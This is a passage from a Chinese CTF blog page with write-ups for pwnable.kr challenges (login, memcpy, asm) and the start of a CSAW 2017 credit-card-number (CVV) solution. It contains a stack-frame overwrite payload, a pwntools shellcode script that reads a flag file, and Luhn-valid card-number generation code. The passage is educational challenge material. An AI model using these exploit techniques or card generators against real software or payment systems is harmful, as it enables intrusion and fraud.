+<p>大概是为了方便构造用户输入, 程序自带了贴心的base64, 脱去这层外衣之后, 实际受控的用户输入只有12个, 很不够用. 而且F5对程序的分析不理想, 一开始没有找到漏洞点. 事实上, 漏洞点在auth函数的汇编中可以看到, 很隐晦.</p>
+<p><img src="2.PNG" alt=""></p>
+<p>此处memcpy参数len最多12, src是secret, dest是eax中的指针, eax = [ebp + var_14] + 0xc, 注意var_14是ebp-14h, 那么eax最终指向ebp-14h+8h=ebp - 8, 就是图中的anonymous_0位置.</p>
+<p><img src="3.PNG" alt=""></p>
+<p>这个位置最多接收12个字节, 但是实际上当前函数只有8个字节, 多余四个会溢出并覆盖父函数EBP. 想要覆盖父函数EIP不够.</p>
+<p>父函数EBP效果不如父函数EIP, 后者可以直接在返回时控制指令流. 但是控制父函数EBP也够了, 如前面论述, 父函数EBP指向父函数的栈底, 与父函数的返回值距离很近. 我们不能控制auth的返回值, 它一定返回到main, 但是main的栈底可以控制, 而栈底下一个元素就是main的返回值.</p>
+<p>接下来寻找可控的”伪栈帧”位置, 前面提到,12位的secret,最后四位是溢出点, 前面8位可以布置成栈帧状:前四位是父父函数的EBP, 这里为了过检测必须是0xdeadbeef, 中间四位是correct地址. 这样一来, 可以构造输入如下:</p>
+<p><code>base64.base64encode(p32(0xdeadbeef) + p32(addr_correct) + p32(addr_secret))</code></p>
+<p>即可拿到flag.</p>
+
+          
+        
+      
+    </div>
+    
+    
     
 
-    <!-- Pages  -->
     
 
-    <!-- Article Number  -->
     
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/29/memcpy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/29/memcpy/" itemprop="url">pwnable.kr之memcpy</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-29T18:00:48+08:00">
+                2017-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>感觉这道题考的是堆分配时字节对齐问题.</p>
+<p>首先上代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">asm</span>(<span class="string">"rdtsc"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</div><div class="line">		dest[i] = src[i];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> dest;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</div><div class="line">	<span class="keyword">size_t</span> i;</div><div class="line">	<span class="comment">// 64-byte block fast copy</span></div><div class="line">	<span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</div><div class="line">		i = len / <span class="number">64</span>;</div><div class="line">		len &amp;= (<span class="number">64</span><span class="number">-1</span>);</div><div class="line">		<span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</div><div class="line">			__asm__ __volatile__ (</div><div class="line">			<span class="string">"movdqa (%0), %%xmm0\n"</span></div><div class="line">			<span class="string">"movdqa 16(%0), %%xmm1\n"</span></div><div class="line">			<span class="string">"movdqa 32(%0), %%xmm2\n"</span></div><div class="line">			<span class="string">"movdqa 48(%0), %%xmm3\n"</span></div><div class="line">			<span class="string">"movntps %%xmm0, (%1)\n"</span></div><div class="line">			<span class="string">"movntps %%xmm1, 16(%1)\n"</span></div><div class="line">			<span class="string">"movntps %%xmm2, 32(%1)\n"</span></div><div class="line">			<span class="string">"movntps %%xmm3, 48(%1)\n"</span></div><div class="line">			::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</div><div class="line">			dest += <span class="number">64</span>;</div><div class="line">			src += <span class="number">64</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// byte-to-byte slow copy</span></div><div class="line">	<span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</div><div class="line">	<span class="keyword">return</span> dest;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line"></div><div class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</div><div class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Hey, I have a boring assignment for CS class.. :(\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The assignment is simple.\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- What is the best implementation of memcpy?        -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- 1. implement your own slow/fast version of memcpy -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- 2. compare them with various size of data         -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- 3. conclude your experiment and submit report     -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This time, just help me out with my experiment and get flag\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No fancy hacking, I promise :D\n"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</div><div class="line">	<span class="keyword">int</span> e;</div><div class="line">	<span class="keyword">char</span>* src;</div><div class="line">	<span class="keyword">char</span>* dest;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;</div><div class="line">	<span class="comment">// allocate memory</span></div><div class="line">	<span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">	<span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">	src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="keyword">size_t</span> sizes[<span class="number">10</span>];</div><div class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">// setup experiment parameters</span></div><div class="line">	<span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;	<span class="comment">// 2^13 = 8K</span></div><div class="line">		low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</div><div class="line">		high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"specify the memcpy amount between %d ~ %d : "</span>, low, high);</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</div><div class="line">		<span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"don't mess with the experiment.\n"</span>);</div><div class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">		&#125;</div><div class="line">		sizes[i++] = size;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	sleep(<span class="number">1</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"ok, lets run the experiment with your configuration\n"</span>);</div><div class="line">	sleep(<span class="number">1</span>);</div><div class="line"></div><div class="line">	<span class="comment">// run experiment</span></div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</div><div class="line">		size = sizes[i];</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"experiment %d : memcpy with buffer size %d\n"</span>, i+<span class="number">1</span>, size);</div><div class="line">		dest = <span class="built_in">malloc</span>( size );</div><div class="line"></div><div class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></div><div class="line">		t1 = rdtsc();</div><div class="line">		slow_memcpy(dest, src, size);		<span class="comment">// byte-to-byte memcpy</span></div><div class="line">		t2 = rdtsc();</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span>, t2-t1);</div><div class="line"></div><div class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></div><div class="line">		t1 = rdtsc();</div><div class="line">		fast_memcpy(dest, src, size);		<span class="comment">// block-to-block memcpy</span></div><div class="line">		t2 = rdtsc();</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span>, t2-t1);</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"thanks for helping my experiment!\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"flag : ----- erased in this source code -----\n"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>程序中自己实现了一个快速的memcpy函数, 题目要求是只要能够跑完所有的测试用例就可以拿到flag, 但是随意输入一些会segment fault.</p>
+<p><img src="1.PNG" alt=""></p>
+<p>这个神奇的浮点运算operand movntps没见过, 查一下它的定义, 发现有这样一个报错点:</p>
+<blockquote>
+<p>The destination operand is a 128-bit or 256-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version) or 32-byte (VEX.256 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</p>
+</blockquote>
+<p>也就是说它的目的地址需要是0x10对齐的, 但是看我们的程序, 此时操作目标是[edx] = 0x804c4a8, 明显没有0x10对齐, 这就是报错的原因.</p>
+<p>回到源码里边溯源, 发现edx这个值是malloc返回值, 也就是说堆上返回的值.</p>
+<p>假设我们现在使用这样一个数字序列让程序执行</p>
+<p><code>8 16 32 64 128 256 512 1024 2048 4096</code></p>
+<p>通过在malloc函数后面下断点可以查看堆上的布局. 在堆上首先分配0x8的chunk头, 接下来是8位对齐的空间. 由于程序没有调用过free, 所以堆是递增的. 8共分配了8+8=0x10个字节, 它本身是16位对齐的, 所以它的下一个16开始位置是对齐的. 16需要分配8+16=0x18位. 这样一来下一个就不对齐了. 这种效应在64之前没有影响, 因为64位以下调用的是slow_memcpy, 但是在64以上开始调用fast_memcpy, 就会崩溃.</p>
+<p>解决这个问题很容易, 在每一个会导致不对齐的数字上+8, 那么就对齐了:</p>
+<p><code>8 24 40 72 136 264 520 1032 2056 4104</code></p>
+<p>注意8之后每一个都不对齐, 都加8就好了.</p>
+<p><img src="2.PNG" alt=""></p>
+<p>就不直接贴flag了, 做到这里终于把toddler’s bottle做完了, 前边的好多题比较简单, 当时做没有写writeup. 喘一口气, 告一段落, 接下来继续前进! </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/29/asmlong/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/29/asmlong/" itemprop="url">pwnable.kr之asm</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-29T16:12:29+08:00">
+                2017-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">con = ssh(host=<span class="string">'pwnable.kr'</span>, user=<span class="string">'asm'</span>, password=<span class="string">'guest'</span>, port=<span class="number">2222</span>)</div><div class="line">p = con.connect_remote(<span class="string">'localhost'</span>, <span class="number">9026</span>)</div><div class="line"></div><div class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</div><div class="line">shellcode = <span class="string">""</span></div><div class="line">shellcode += shellcraft.pushstr(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</div><div class="line">shellcode += shellcraft.open(<span class="string">'rsp'</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">shellcode += shellcraft.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</div><div class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'shellcode: '</span>)</div><div class="line">p.send(asm(shellcode))</div><div class="line"><span class="keyword">print</span> p.recvline()</div></pre></td></tr></table></figure>
+<p>所有的系统调用都可以直接生产, ssh也可以连过去, 另外需要注意的就是context很重要.</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/csaw2017-cvv/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/csaw2017-cvv/" itemprop="url">CSAW 2017 CVV及tabIEZ writeup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T17:25:18+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>因为需要准备出差, 只做了一些小题</p>
+</blockquote>
+<h2 id="CVV"><a href="#CVV" class="headerlink" title="CVV"></a>CVV</h2><p>信用卡号码算算号器和随机生成器<br><a href="https://zh.wikipedia.org/zh-hans/Luhn%E7%AE%97%E6%B3%95" target="_blank" rel="external">https://zh.wikipedia.org/zh-hans/Luhn%E7%AE%97%E6%B3%95</a><br>从网上找的代码，有问题按照Luhn代码算法说明改</p>
+<p>代码很烂，都是粘的还有错。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="comment"># author: garbu</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_card</span><span class="params">(type)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    Prefill some values based on the card type</span></div><div class="line"><span class="string">    """</span></div><div class="line">    card_types = [<span class="string">"americanexpress"</span>,<span class="string">"visa11"</span>, <span class="string">"visa16"</span>,<span class="string">"mastercard"</span>,<span class="string">"discover"</span>]</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prefill</span><span class="params">(t)</span>:</span></div><div class="line">        <span class="comment"># typical number of digits in credit card</span></div><div class="line">        def_length = <span class="number">16</span></div><div class="line">        </div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        Prefill with initial numbers and return it including the total number of digits</span></div><div class="line"><span class="string">        remaining to fill</span></div><div class="line"><span class="string">        """</span></div><div class="line">        <span class="keyword">if</span> <span class="string">'num:'</span> <span class="keyword">in</span> t:</div><div class="line">            <span class="keyword">return</span> [int(t[<span class="number">4</span>]), int(t[<span class="number">5</span>]), int(t[<span class="number">6</span>]), int(t[<span class="number">7</span>])], <span class="number">12</span></div><div class="line">        <span class="keyword">if</span> t == card_types[<span class="number">0</span>]:</div><div class="line">            <span class="comment"># american express starts with 3 and is 15 digits long</span></div><div class="line">            <span class="comment"># override the def lengths</span></div><div class="line">            <span class="keyword">return</span> [<span class="number">3</span>, randint(<span class="number">4</span>,<span class="number">7</span>)], <span class="number">13</span></div><div class="line">            </div><div class="line">        <span class="keyword">elif</span> t == card_types[<span class="number">1</span>] <span class="keyword">or</span> t == card_types[<span class="number">2</span>]:</div><div class="line">            <span class="comment"># visa starts with 4</span></div><div class="line">            <span class="keyword">if</span> t.endswith(<span class="string">"16"</span>):</div><div class="line">                <span class="keyword">return</span> [<span class="number">4</span>], def_length - <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">return</span> [<span class="number">4</span>], <span class="number">10</span></div><div class="line">            </div><div class="line">        <span class="keyword">elif</span> t == card_types[<span class="number">3</span>]:</div><div class="line">            <span class="comment"># master card start with 5 and is 16 digits long</span></div><div class="line">            <span class="keyword">return</span> [<span class="number">5</span>, randint(<span class="number">1</span>,<span class="number">5</span>)], def_length - <span class="number">2</span></div><div class="line">            </div><div class="line">        <span class="keyword">elif</span> t == card_types[<span class="number">4</span>]:</div><div class="line">            <span class="comment"># discover card starts with 6011 and is 16 digits long</span></div><div class="line">            <span class="keyword">return</span> [<span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], def_length - <span class="number">4</span></div><div class="line">            </div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="comment"># this section probably not even needed here</span></div><div class="line">            <span class="keyword">return</span> [], def_length</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finalize</span><span class="params">(nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        Make the current generated list pass the Luhn check by checking and adding</span></div><div class="line"><span class="string">        the last digit appropriately bia calculating the check sum</span></div><div class="line"><span class="string">        """</span></div><div class="line">        check_sum = <span class="number">0</span></div><div class="line">        </div><div class="line">        <span class="comment">#is_even = True if (len(nums) + 1 % 2) == 0 else False</span></div><div class="line">        </div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        Reason for this check offset is to figure out whther the final list is going</span></div><div class="line"><span class="string">        to be even or odd which will affect calculating the check_sum.</span></div><div class="line"><span class="string">        This is mainly also to avoid reversing the list back and forth which is specified</span></div><div class="line"><span class="string">        on the Luhn algorithm.</span></div><div class="line"><span class="string">        """</span></div><div class="line">        check_offset = (len(nums) + <span class="number">1</span>) % <span class="number">2</span></div><div class="line">        </div><div class="line">        <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(nums):</div><div class="line">            <span class="keyword">if</span> (i + check_offset) % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">                n_ = n*<span class="number">2</span></div><div class="line">                check_sum += n_ <span class="number">-9</span> <span class="keyword">if</span> n_ &gt; <span class="number">9</span> <span class="keyword">else</span> n_</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                check_sum += n</div><div class="line">     